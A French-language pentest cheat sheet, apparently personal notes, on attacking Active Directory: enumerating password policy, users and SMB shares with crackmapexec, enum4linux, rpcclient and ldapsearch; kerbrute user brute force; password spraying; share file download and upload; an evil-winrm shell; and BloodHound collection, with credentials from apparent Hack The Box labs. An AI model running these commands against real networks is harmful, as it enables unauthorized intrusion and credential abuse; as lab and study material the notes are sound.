---
public: true 
#Tags: tag1, tag2
---

## Récupération d'informations Active Directory et partages



## Politique de mot de passe

### SMB
```shell
# crackmapexec
cme smb $TARGET_IP -u "sql_svc" -p "qsdqsd" -d "domain"  --pass-pol | cut -c60-

# enum4linux
enum4linux -u "" -p "" -P $TARGET_IP

# rpcclient
rpcclient -U "" -N $TARGET_IP
$> querydominfo

```

### LDAP

```shell
# ldapsearch
ldapsearch -h $TARGET_IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

## Comptes utilisateurs

### Listing

#### SMB

```shell
# crackmapexec
cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users

# enum4linux
enum4linux -u "" -p "" -U $TARGET_IP

# rpcclient
rpcclient -U "" -N $TARGET_IP
$> enumdomusers

# Creation d'une liste d'utilisateurs
cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\' -f 2 | tee users.txt
```

#### LDAP

```shell
# crackmapexec
cme ldap -u $AD_USER -p $AD_PASSWORD $TARGET_IP -dc-ip $TARGET_IP --users

# ldapsearch
ldapsearch -h $TARGET_IP -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -d ' ' -f2
```

### Découverte par bruteforce

On pourra utiliser la liste des 

```shell
kerbrute userenum -d DOMAIN.LOCAL --dc $TARGET_IP userbiglist.Txt
```

### Comptes utilisateurs

#### Password Spraying
```
# Collect users
cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\' -f 2 | tee users.txt

# Password spraying with new grabbed users
cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --continue-on-success
```

#### Partages
##### Enumération

```shell
cme smb $TARGET -u "" -p "" --shares
cme smb $TARGET_IP -u "sql_svc" -p "REGGIE1234ronnie" -d "sequel"  --shares | cut -c60-
```

```shell
# 
cme smb $TARGET_IP  -u 'guest' -p '' --shares | cut -c60-
      [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
      [+] sequel.htb\guest: 
      [+] Enumerated shares
      Share           Permissions     Remark
      -----           -----------     ------
      ADMIN$                          Remote Admin
      C$                              Default share
      IPC$            READ            Remote IPC
      NETLOGON                        Logon server share 
      Public          READ            
      SYSVOL                          Logon server share 
# Authentification NULL
enum4linux -a -u "" -p "" $TARGET_IP

enum4linux-ng -A -R -C <IP>

# Authentification avec le compte Guest (si non désactivé)
enum4linux -a -u "guest" -p "" $TARGET_IP

# liste des partage avec type d'accès (lecture / écrite / rien)
smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP
```


### Accès à un partage 

#### smbclient.py
```shell
smbclient.py -no-pass $TARGET_IP  # null bind
smbclient.py "$AD_DOMAIN/$AD_USER:$AD_PASSWORD@$TARGET_IP"    

smbclient.py guest@sequel.htb
Password:       <==== Appuyer sur Entrer
# shares        <==== liste les partages
# use <share name>  <=== se connecte à ce partage
# ls / cd  / cat [...]
```

#### smbclient
```
smbclient -U guest%'' //$TARGET_IP/WorkShares 

# null authentication
smbclient -N -L //$TARGET_IP   # liste les partages
```
#### smbmap
```shell
# Liste des partages 
smbmap -u "" -p "" -H $TARGET_IP   

# Liste de façon récursive les fichiers d'un partage (indique si les droits sont en écriture ou en lecture)
smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R "$SHARE/"

# Téléchargement d'un fichier 
$ smbmap -u "" -p "" -H $TARGET_IP --download  "sambashare\contents\flag.txt"

# Upload d'un fichier 
smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP --upload desktop.ini Share/desktop.ini
```


### Explorer les partages 

```bash
# Lister tous les fichiers de tous les partages
rm -rf /tmp/cme_spider_plus # dossier contenant les résultats du module spider_plus
cme smb $TARGET_IP -u $AD_USER -p "$AD_PASSWORD" -M spider_plus 
cat /tmp/cme_spider_plus/*.json | jq '. | to_entries | .[] | {share: .key, file: .value | to_entries | .[].key} | "\(.share) | \(.file)"' | tee $TARGET_IP-share_files.txt

```

## Shell
```shell
# Vérification d'accès WINRM
cme winrm $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD" -d "$AD_DOMAIN"  | cut -c60-
2     [*] http://10.10.11.202:5985/wsman
2     [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)

# Obtention du shell via evil-winrm
evil-winrm -i $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD"
```

## Bloodhound
```
# Bloodhound python injector available as a docker image (python2)
sudo docker run --rm -v ${PWD}:/bloodhound-data -it bloodhound 
$ bloodhound-python  -u 'svc_apache' -p 'S@Ss!K@*t13' -c All -d 'flight.htb' -v -ns 10.10.11.187
```


